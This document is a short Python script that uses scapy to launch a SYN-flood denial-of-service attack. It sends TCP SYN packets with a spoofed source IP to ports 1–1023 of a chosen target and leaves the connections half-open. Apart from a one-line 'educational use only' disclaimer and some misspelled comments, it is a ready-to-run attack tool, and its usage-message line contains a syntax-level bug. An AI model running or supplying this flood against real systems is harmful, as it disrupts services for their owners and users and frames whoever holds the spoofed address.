# !/usr/bin/python

# This tool is for educational use only!

# Derscription: A DOS (Denail of Service) where TCP Pacets are sent and
# not confirmed again (Destination left in "Half Open" connection state)
# To prevent to get DOS'ed from the Destination Machine we use IP Spoofing.

# Requirements: scapy and root privileges

import sys
from scapy.all import srflood, IP, TCP

if len(sys.argv) < 3:
  print "{0} <spoofed_source_ip> <target>".sys.argv[0]
  sys.exit(1)

packet = IP(src=sys.argv[1], dst=sys.argv[2]) / \
  TCP(dport=range(1, 1024), flags="S")

srflood(packet, store=0)
